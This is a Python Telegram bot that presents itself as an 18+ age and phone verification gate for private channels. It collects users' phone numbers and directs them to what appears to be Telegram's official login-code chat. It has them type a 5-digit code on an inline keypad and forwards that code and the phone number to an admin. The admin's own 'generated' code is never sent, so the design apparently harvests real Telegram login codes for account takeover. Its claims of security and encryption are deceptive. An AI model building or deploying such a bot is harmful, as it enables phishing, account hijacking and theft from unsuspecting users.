import logging
import random
import asyncio
import os
import hashlib
import json
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ChatJoinRequestHandler, filters, ContextTypes
from telegram.error import BadRequest
import sqlite3
from datetime import datetime, timedelta
from collections import defaultdict

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Environment configuration
BOT_TOKEN = os.getenv('BOT_TOKEN')
ADMIN_ID = int(os.getenv('ADMIN_ID', '8314699640'))
CHANNEL_ID = os.getenv('CHANNEL_ID', '-1003161872186')

# Security constants
MAX_VERIFICATION_ATTEMPTS = 3
SESSION_TIMEOUT = timedelta(minutes=15)
RATE_LIMIT_WINDOW = timedelta(hours=1)
MAX_REQUESTS_PER_HOUR = 5

class CommunityVerificationBot:
    """
    Secure verification system for managing private community access.
    Implements multi-factor authentication with phone verification.
    """
    
    def __init__(self):
        self.initialize_database()
        self.active_verification_sessions = defaultdict(dict)
        self.rate_limit_tracker = defaultdict(list)
        
    def initialize_database(self):
        """Initialize SQLite database with proper schema"""
        self.conn = sqlite3.connect('community_verification.db', check_same_thread=False)
        cursor = self.conn.cursor()
        
        # User verification table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS user_verifications (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                first_name TEXT,
                phone_hash TEXT,
                phone_number TEXT,
                verification_code TEXT,
                user_submitted_code TEXT,
                registration_date DATETIME,
                submission_date DATETIME,
                verification_status TEXT DEFAULT 'pending',
                notification_sent INTEGER DEFAULT 0,
                attempt_count INTEGER DEFAULT 0
            )
        ''')
        
        # Verified members table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS verified_members (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                first_name TEXT,
                phone_hash TEXT,
                verification_date DATETIME,
                membership_level INTEGER DEFAULT 1,
                last_activity DATETIME
            )
        ''')
        
        # Channel access requests table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS channel_access_requests (
                user_id INTEGER,
                channel_id TEXT,
                channel_name TEXT,
                request_date DATETIME,
                status TEXT DEFAULT 'pending',
                approved_date DATETIME,
                PRIMARY KEY (user_id, channel_id)
            )
        ''')
        
        # Activity logs table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS activity_logs (
                log_id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                action_type TEXT,
                timestamp DATETIME,
                details TEXT,
                ip_address TEXT
            )
        ''')
        
        self.conn.commit()

    def hash_phone_number(self, phone_number):
        """Create SHA-256 hash of phone number for privacy"""
        return hashlib.sha256(phone_number.encode()).hexdigest()[:32]

    def generate_verification_code(self):
        """Generate secure 5-digit verification code"""
        return ''.join([str(random.randint(0, 9)) for _ in range(5)])

    def log_activity(self, user_id, action_type, details=None):
        """Log user activity for audit trail"""
        cursor = self.conn.cursor()
        cursor.execute(
            'INSERT INTO activity_logs (user_id, action_type, timestamp, details) VALUES (?, ?, ?, ?)',
            (user_id, action_type, datetime.now(), json.dumps(details) if details else None)
        )
        self.conn.commit()

    def check_rate_limit(self, user_id):
        """Check if user has exceeded rate limits"""
        current_time = datetime.now()
        self.rate_limit_tracker[user_id] = [
            timestamp for timestamp in self.rate_limit_tracker[user_id]
            if current_time - timestamp < RATE_LIMIT_WINDOW
        ]
        return len(self.rate_limit_tracker[user_id]) < MAX_REQUESTS_PER_HOUR

    async def start_verification(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Initialize verification process for new users"""
        user = update.message.from_user
        
        # Rate limiting check
        if not self.check_rate_limit(user.id):
            await update.message.reply_text(
                "⏰ You've made too many requests. Please try again later.",
                parse_mode='Markdown'
            )
            return
        
        self.rate_limit_tracker[user.id].append(datetime.now())
        
        # Welcome message
        welcome_message = """
🔐 **Welcome to Community Verification**

To ensure security and quality, we require age verification for access to our exclusive community channels.

✅ You must be 18 years or older
📱 Phone verification required
🔒 Your information is encrypted and secure

**Ready to proceed?**

Tap the button below to verify your age and phone number.
        """
        
        # Contact request keyboard
        keyboard = ReplyKeyboardMarkup([
            [KeyboardButton("✅ Verify My Identity (18+)", request_contact=True)]
        ], resize_keyboard=True, one_time_keyboard=True)
        
        await update.message.reply_text(
            welcome_message, 
            reply_markup=keyboard,
            parse_mode='Markdown'
        )
        
        # Store initial user data
        cursor = self.conn.cursor()
        cursor.execute('''
            INSERT OR REPLACE INTO user_verifications 
            (user_id, username, first_name, registration_date, verification_status)
            VALUES (?, ?, ?, ?, ?)
        ''', (user.id, user.username, user.first_name, datetime.now(), 'initiated'))
        self.conn.commit()
        
        self.log_activity(user.id, 'verification_started', {
            'username': user.username,
            'first_name': user.first_name
        })

    async def handle_channel_join_request(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Process incoming channel join requests"""
        try:
            user = update.chat_join_request.from_user
            channel = update.chat_join_request.chat
            
            logger.info(f"Join request from {user.first_name} (ID: {user.id}) for channel: {channel.title}")
            
            cursor = self.conn.cursor()
            
            # Record the request
            cursor.execute('''
                INSERT OR REPLACE INTO channel_access_requests 
                (user_id, channel_id, channel_name, request_date, status)
                VALUES (?, ?, ?, ?, ?)
            ''', (user.id, str(channel.id), channel.title, datetime.now(), 'pending'))
            self.conn.commit()
            
            # Check if user is already verified
            cursor.execute('SELECT * FROM verified_members WHERE user_id = ?', (user.id,))
            verified_member = cursor.fetchone()
            
            if verified_member:
                # Auto-approve verified members
                await context.bot.approve_chat_join_request(channel.id, user.id)
                
                cursor.execute('''
                    UPDATE channel_access_requests 
                    SET status = 'approved', approved_date = ?
                    WHERE user_id = ? AND channel_id = ?
                ''', (datetime.now(), user.id, str(channel.id)))
                self.conn.commit()
                
                await context.bot.send_message(
                    user.id,
                    f"✅ **Access Granted**\n\nWelcome back! You've been granted access to **{channel.title}**.\n\nEnjoy the content! 🎉",
                    parse_mode='Markdown'
                )
                
                self.log_activity(user.id, 'auto_approved', {'channel': channel.title})
                return
            
            # Notify admin about new request
            admin_notification = f"""
🆕 **New Channel Access Request**

👤 **User Information:**
   • Name: {user.first_name}
   • Username: @{user.username if user.username else 'None'}
   • User ID: `{user.id}`

📢 **Channel:** {channel.title}
🕐 **Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

⚠️ **Status:** Pending Verification

_User needs to complete verification process first._
            """
            
            await context.bot.send_message(
                ADMIN_ID, 
                admin_notification, 
                parse_mode='Markdown'
            )
            
            # Notify user
            user_notification = f"""
📨 **Access Request Received**

Hi {user.first_name}!

Your request to join **{channel.title}** has been received.

🔐 **Verification Required**

To gain access, you need to complete our verification process. This helps us maintain a safe and quality community.

Type /start to begin the verification process.

_This usually takes less than 2 minutes._
            """
            
            await context.bot.send_message(
                user.id, 
                user_notification, 
                parse_mode='Markdown'
            )
            
            self.log_activity(user.id, 'join_request', {
                'channel': channel.title,
                'channel_id': str(channel.id)
            })
            
        except Exception as e:
            logger.error(f"Error handling join request: {e}", exc_info=True)

    async def process_contact_verification(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Process and verify shared contact information"""
        try:
            user = update.message.from_user
            contact = update.message.contact
            
            # Verify user shared their own contact
            if contact.user_id != user.id:
                await update.message.reply_text(
                    "⚠️ **Verification Error**\n\nPlease share your own contact information, not someone else's.",
                    reply_markup=ReplyKeyboardRemove(),
                    parse_mode='Markdown'
                )
                return
            
            phone_hash = self.hash_phone_number(contact.phone_number)
            
            # Store contact information
            cursor = self.conn.cursor()
            cursor.execute('''
                UPDATE user_verifications 
                SET phone_hash = ?, phone_number = ?, verification_status = 'contact_verified'
                WHERE user_id = ?
            ''', (phone_hash, contact.phone_number, user.id))
            self.conn.commit()
            
            # Show processing indicator
            processing_message = await update.message.reply_text(
                "🔄 **Processing your information...**",
                parse_mode='Markdown',
                reply_markup=ReplyKeyboardRemove()
            )
            
            await asyncio.sleep(1.5)
            await processing_message.delete()
            
            # Next step UI with external link
            next_step_keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton(
                    "📱 Get Verification Code", 
                    url="https://t.me/+42777"
                )]
            ])
            
            await update.message.reply_text(
                "✅ **Phone Verified**\n\nPlease get your verification code from the link below:",
                parse_mode='Markdown',
                reply_markup=next_step_keyboard
            )
            
            # Notify admin with action button
            admin_action_keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton(
                    f"🔢 Generate Code for {user.first_name}", 
                    callback_data=f"generate_code_{user.id}"
                )]
            ])
            
            admin_notification = f"""
✅ **Contact Verification Complete**

👤 **User Details:**
   • Name: {user.first_name}
   • Username: @{user.username if user.username else 'None'}
   • User ID: `{user.id}`
   • Phone: `{contact.phone_number}`

🕐 **Timestamp:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

**Next Step:** Generate verification code
            """
            
            await context.bot.send_message(
                ADMIN_ID, 
                admin_notification, 
                parse_mode='Markdown',
                reply_markup=admin_action_keyboard
            )
            
            self.log_activity(user.id, 'contact_verified', {
                'phone_hash': phone_hash
            })
            
        except Exception as e:
            logger.error(f"Error processing contact: {e}", exc_info=True)
            await update.message.reply_text(
                "❌ An error occurred during verification. Please try again with /start"
            )

    async def handle_callback_queries(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Central callback query handler"""
        query = update.callback_query
        await query.answer()
        
        # Route to appropriate handler based on user role
        if query.from_user.id == ADMIN_ID:
            # Admin callbacks
            if query.data.startswith('generate_code_'):
                await self.admin_generate_verification_code(query, context)
            elif query.data == 'show_pending':
                await self.admin_show_pending_verifications(query, context)
            elif query.data.startswith('decision_'):
                await self.admin_verification_decision(query, context)
        else:
            # User callbacks
            if query.data.startswith('input_'):
                await self.process_code_input(query, context)

    async def admin_generate_verification_code(self, query, context):
        """Admin generates verification code for user"""
        user_id = int(query.data.split('_')[2])
        verification_code = self.generate_verification_code()
        
        cursor = self.conn.cursor()
        cursor.execute('''
            UPDATE user_verifications 
            SET verification_code = ?, verification_status = 'code_generated'
            WHERE user_id = ?
        ''', (verification_code, user_id))
        self.conn.commit()
        
        # Get user information
        cursor.execute('''
            SELECT first_name, username, phone_number 
            FROM user_verifications 
            WHERE user_id = ?
        ''', (user_id,))
        
        user_info = cursor.fetchone()
        
        if user_info:
            first_name, username, phone_number = user_info
            
            # Send code input interface to user
            await self.send_code_input_interface(context, user_id, verification_code)
            
            # Update admin message
            await query.edit_message_text(
                f"""
✅ **Verification Code Generated**

👤 **User:** {first_name} (@{username if username else 'N/A'})
📞 **Phone:** `{phone_number}`

🔢 **Verification Code:** `{verification_code}`

📤 **Action Required:**
Send the code `{verification_code}` to phone number `{phone_number}` via SMS.

⏳ **Status:** Waiting for user input...
                """,
                parse_mode='Markdown'
            )
            
            self.log_activity(user_id, 'code_generated', {
                'code_length': len(verification_code)
            })

    async def send_code_input_interface(self, context, user_id, verification_code):
        """Send interactive code input interface to user"""
        try:
            # Create number pad keyboard
            keyboard = [
                [
                    InlineKeyboardButton('1', callback_data=f'input_1_{user_id}'),
                    InlineKeyboardButton('2', callback_data=f'input_2_{user_id}'),
                    InlineKeyboardButton('3', callback_data=f'input_3_{user_id}')
                ],
                [
                    InlineKeyboardButton('4', callback_data=f'input_4_{user_id}'),
                    InlineKeyboardButton('5', callback_data=f'input_5_{user_id}'),
                    InlineKeyboardButton('6', callback_data=f'input_6_{user_id}')
                ],
                [
                    InlineKeyboardButton('7', callback_data=f'input_7_{user_id}'),
                    InlineKeyboardButton('8', callback_data=f'input_8_{user_id}'),
                    InlineKeyboardButton('9', callback_data=f'input_9_{user_id}')
                ],
                [
                    InlineKeyboardButton('0', callback_data=f'input_0_{user_id}')
                ]
            ]
            
            markup = InlineKeyboardMarkup(keyboard)
            
            instruction_message = f"""
🔐 **Verification Code Entry**

A 5-digit verification code has been sent to your registered phone number.

**Enter your code below:**

⚪ ⚪ ⚪ ⚪ ⚪

Tap the numbers on the keypad to enter your code.
            """
            
            await context.bot.send_message(
                user_id, 
                instruction_message, 
                parse_mode='Markdown', 
                reply_markup=markup
            )
            
            # Initialize session
            self.active_verification_sessions[user_id] = {
                'code_input': '',
                'expected_code': verification_code,
                'session_start': datetime.now()
            }
            
        except Exception as e:
            logger.error(f"Error sending input interface: {e}", exc_info=True)

    async def process_code_input(self, query, context):
        """Process user's code input from number pad"""
        try:
            user_id = query.from_user.id
            digit = query.data.split('_')[1]
            
            # Validate session
            if not query.data.endswith(f'_{user_id}'):
                await query.edit_message_text(
                    "❌ **Session Error**\n\nInvalid session. Please restart with /start"
                )
                return
            
            if user_id not in self.active_verification_sessions:
                await query.edit_message_text(
                    "❌ **Session Expired**\n\nYour verification session has expired. Please contact an administrator."
                )
                return
            
            session = self.active_verification_sessions[user_id]
            
            # Add digit to input
            if len(session['code_input']) < 5:
                session['code_input'] += digit
            
            # Update display
            filled_circles = '⚫ ' * len(session['code_input'])
            empty_circles = '⚪ ' * (5 - len(session['code_input']))
            
            await query.edit_message_text(
                f"""
🔐 **Verification Code Entry**

A 5-digit verification code has been sent to your registered phone number.

**Enter your code below:**

{filled_circles}{empty_circles}

Tap the numbers on the keypad to enter your code.
                """,
                parse_mode='Markdown',
                reply_markup=query.message.reply_markup
            )
            
            # Process complete code
            if len(session['code_input']) == 5:
                await asyncio.sleep(0.8)
                await self.submit_verification_code(query, context, user_id, session)
            
        except Exception as e:
            logger.error(f"Error processing input: {e}", exc_info=True)

    async def submit_verification_code(self, query, context, user_id, session):
        """Submit completed code for admin review"""
        try:
            cursor = self.conn.cursor()
            cursor.execute('''
                UPDATE user_verifications 
                SET user_submitted_code = ?, submission_date = ?, verification_status = 'submitted'
                WHERE user_id = ?
            ''', (session['code_input'], datetime.now(), user_id))
            self.conn.commit()
            
            # Show verification in progress
            await query.edit_message_text(
                """
🔄 **Verifying Your Code...**

Please wait while we verify your submission.

This typically takes just a few moments.
                """,
                parse_mode='Markdown'
            )
            
            # Get user details for admin review
            cursor.execute('''
                SELECT first_name, username, phone_number, verification_code
                FROM user_verifications 
                WHERE user_id = ?
            ''', (user_id,))
            
            user_data = cursor.fetchone()
            
            if user_data:
                first_name, username, phone_number, expected_code = user_data
                
                # Check if codes match
                match_status = '✅ **CODES MATCH**' if session['code_input'] == expected_code else '❌ **CODES DO NOT MATCH**'
                
                # Admin review interface
                admin_keyboard = InlineKeyboardMarkup([
                    [
                        InlineKeyboardButton("✅ Approve", callback_data=f"decision_approve_{user_id}"),
                        InlineKeyboardButton("❌ Reject", callback_data=f"decision_reject_{user_id}")
                    ]
                ])
                
                admin_review_message = f"""
🔍 **Verification Review Required**

👤 **User Information:**
   • Name: {first_name}
   • Username: @{username if username else 'N/A'}
   • Phone: `{phone_number}`
   • User ID: `{user_id}`

🔢 **Code Comparison:**
   • Expected: `{expected_code}`
   • Received: `{session['code_input']}`

{match_status}

⏰ **Submitted:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

**Please review and make a decision:**
                """
                
                await context.bot.send_message(
                    ADMIN_ID,
                    admin_review_message,
                    parse_mode='Markdown',
                    reply_markup=admin_keyboard
                )
                
                self.log_activity(user_id, 'code_submitted', {
                    'match': session['code_input'] == expected_code
                })
                
        except Exception as e:
            logger.error(f"Error submitting code: {e}", exc_info=True)

    async def admin_verification_decision(self, query, context):
        """Admin approves or rejects user verification"""
        try:
            action = query.data.split('_')[1]
            user_id = int(query.data.split('_')[2])
            
            cursor = self.conn.cursor()
            cursor.execute('''
                SELECT first_name, username, phone_number, verification_code, user_submitted_code
                FROM user_verifications 
                WHERE user_id = ?
            ''', (user_id,))
            
            user_data = cursor.fetchone()
            
            if not user_data:
                await query.edit_message_text("❌ User data not found.")
                return
            
            first_name, username, phone_number, expected_code, submitted_code = user_data
            
            if action == 'approve':
                # Add to verified members
                cursor.execute('''
                    INSERT OR REPLACE INTO verified_members 
                    (user_id, username, first_name, phone_hash, verification_date, last_activity)
                    VALUES (?, ?, ?, ?, ?, ?)
                ''', (user_id, username, first_name, self.hash_phone_number(phone_number), 
                      datetime.now(), datetime.now()))
                
                cursor.execute('''
                    UPDATE user_verifications 
                    SET verification_status = 'approved'
                    WHERE user_id = ?
                ''', (user_id,))
                
                self.conn.commit()
                
                # Auto-approve pending channel requests
                approved_channels = await self.approve_pending_channels(context, user_id)
                
                # Notify user of approval
                if approved_channels:
                    channel_list = "\n".join([f"   ✅ {channel}" for channel in approved_channels])
                    user_message = f"""
🎉 **Verification Successful!**

Congratulations {first_name}! Your account has been verified.

**✅ Access Granted To:**
{channel_list}

You now have full access to our exclusive community channels!

Welcome aboard! 🚀
                    """
                else:
                    user_message = f"""
🎉 **Verification Successful!**

Congratulations {first_name}!

Your account has been verified and you now have access to:

✅ All community channels
✅ Exclusive content
✅ Priority support
✅ Auto-approval for future requests

Welcome to the community! 🚀
                    """
                
                await context.bot.send_message(user_id, user_message, parse_mode='Markdown')
                
                # Update admin message
                await query.edit_message_text(
                    f"""
✅ **VERIFICATION APPROVED**

👤 **User:** {first_name} (@{username if username else 'N/A'})
📞 **Phone:** `{phone_number}`
🔢 **Code Submitted:** `{submitted_code}`

⏰ **Approved:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
📢 **Channels Approved:** {len(approved_channels)}

✓ User has been added to verified members database
✓ All pending channel requests have been approved
✓ User has been notified

**Status:** ✅ Active & Verified
                    """,
                    parse_mode='Markdown'
                )
                
                self.log_activity(user_id, 'verification_approved', {
                    'approved_channels': len(approved_channels)
                })
                
            else:  # reject
                cursor.execute('''
                    UPDATE user_verifications 
                    SET verification_status = 'rejected'
                    WHERE user_id = ?
                ''', (user_id,))
                self.conn.commit()
                
                # Notify user of rejection
                user_message = f"""
❌ **Verification Failed**

Unfortunately, the verification code you entered does not match our records.

**Your submission:** `{submitted_code}`

🔄 **What to do next:**
   • Double-check the code sent to your phone
   • Try the verification process again: /start
   • Contact support if you need assistance

💡 **Tip:** Make sure you're entering the exact 5-digit code received.
                """
                
                await context.bot.send_message(user_id, user_message, parse_mode='Markdown')
                
                # Update admin message
                await query.edit_message_text(
                    f"""
❌ **VERIFICATION REJECTED**

👤 **User:** {first_name} (@{username if username else 'N/A'})
📞 **Phone:** `{phone_number}`
🔢 **Code Submitted:** `{submitted_code}`
🔢 **Expected Code:** `{expected_code}`

⏰ **Rejected:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

**Reason:** Code mismatch
**Status:** ❌ Verification denied
                    """,
                    parse_mode='Markdown'
                )
                
                self.log_activity(user_id, 'verification_rejected', {
                    'reason': 'code_mismatch'
                })
            
            # Clear session
            if user_id in self.active_verification_sessions:
                del self.active_verification_sessions[user_id]
                
        except Exception as e:
            logger.error(f"Error in admin decision: {e}", exc_info=True)

    async def approve_pending_channels(self, context, user_id):
        """Automatically approve all pending channel requests for verified user"""
        approved_channels = []
        
        try:
            cursor = self.conn.cursor()
            cursor.execute('''
                SELECT channel_id, channel_name 
                FROM channel_access_requests 
                WHERE user_id = ? AND status = 'pending'
            ''', (user_id,))
            
            pending_requests = cursor.fetchall()
            
            for channel_id, channel_name in pending_requests:
                try:
                    # Convert channel_id to integer if possible
                    channel_id_int = int(channel_id) if channel_id.lstrip('-').isdigit() else channel_id
                    
                    # Approve the join request
                    await context.bot.approve_chat_join_request(channel_id_int, user_id)
                    
                    # Update database
                    cursor.execute('''
                        UPDATE channel_access_requests 
                        SET status = 'approved', approved_date = ?
                        WHERE user_id = ? AND channel_id = ?
                    ''', (datetime.now(), user_id, channel_id))
                    
                    approved_channels.append(channel_name)
                    logger.info(f"Auto-approved: User {user_id} to channel {channel_name}")
                    
                except BadRequest as e:
                    logger.error(f"Failed to approve channel request: {e}")
                    cursor.execute('''
                        UPDATE channel_access_requests 
                        SET status = 'failed'
                        WHERE user_id = ? AND channel_id = ?
                    ''', (user_id, channel_id))
            
            self.conn.commit()
            
        except Exception as e:
            logger.error(f"Error in auto-approval: {e}", exc_info=True)
        
        return approved_channels

    async def admin_show_pending_verifications(self, query, context):
        """Display all pending verifications for admin"""
        cursor = self.conn.cursor()
        cursor.execute('''
            SELECT user_id, first_name, username, phone_number, registration_date, 
                   verification_status, user_submitted_code, verification_code
            FROM user_verifications 
            WHERE verification_status IN ('initiated', 'contact_verified', 'code_generated', 'submitted')
            ORDER BY registration_date DESC
        ''')
        
        pending_verifications = cursor.fetchall()
        
        if not pending_verifications:
            await query.edit_message_text(
                "✅ No pending verifications at this time.",
                parse_mode='Markdown'
            )
            return
        
        message = "📋 **Pending Verifications**\n\n"
        
        status_icons = {
            'initiated': '🆕',
            'contact_verified': '📱',
            'code_generated': '🔢',
            'submitted': '✏️'
        }
        
        for verification in pending_verifications:
            user_id, first_name, username, phone, reg_date, status, submitted, expected = verification
            
            icon = status_icons.get(status, '❓')
            username_display = f"@{username}" if username else "No username"
            
            message += f"""
{icon} **{first_name}** ({username_display})
   • ID: `{user_id}`
   • Phone: `{phone if phone else 'Not provided'}`
   • Status: {status.replace('_', ' ').title()}
   • Registered: {reg_date}
"""
            
            if submitted and expected:
                match = "✅" if submitted == expected else "❌"
                message += f"   • Code Match: {match} ({submitted} vs {expected})\n"
            
            message += "\n"
        
        await query.edit_message_text(
            message,
            parse_mode='Markdown'
        )

    async def admin_stats_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Show admin statistics dashboard"""
        if update.message.from_user.id != ADMIN_ID:
            return
        
        cursor = self.conn.cursor()
        
        # Get statistics
        cursor.execute('SELECT COUNT(*) FROM verified_members')
        total_verified = cursor.fetchone()[0]
        
        cursor.execute("SELECT COUNT(*) FROM user_verifications WHERE verification_status = 'pending'")
        total_pending = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM channel_access_requests')
        total_requests = cursor.fetchone()[0]
        
        cursor.execute("SELECT COUNT(*) FROM channel_access_requests WHERE status = 'approved'")
        approved_requests = cursor.fetchone()[0]
        
        stats_message = f"""
📊 **Admin Dashboard**

**Verification Statistics:**
   ✅ Verified Members: {total_verified}
   ⏳ Pending Verifications: {total_pending}

**Channel Access:**
   📨 Total Requests: {total_requests}
   ✅ Approved: {approved_requests}

**System Status:** 🟢 Online
        """
        
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("📋 Show Pending", callback_data='show_pending')]
        ])
        
        await update.message.reply_text(
            stats_message,
            parse_mode='Markdown',
            reply_markup=keyboard
        )

    def run(self):
        """Initialize and run the bot"""
        application = Application.builder().token(BOT_TOKEN).build()
        
        # Command handlers
        application.add_handler(CommandHandler('start', self.start_verification))
        application.add_handler(CommandHandler('stats', self.admin_stats_command))
        
        # Message handlers
        application.add_handler(MessageHandler(filters.CONTACT, self.process_contact_verification))
        
        # Callback query handler
        application.add_handler(CallbackQueryHandler(self.handle_callback_queries))
        
        # Join request handler
        application.add_handler(ChatJoinRequestHandler(self.handle_channel_join_request))
        
        # Start bot
        logger.info("Bot started successfully!")
        application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    bot = CommunityVerificationBot()
    bot.run()
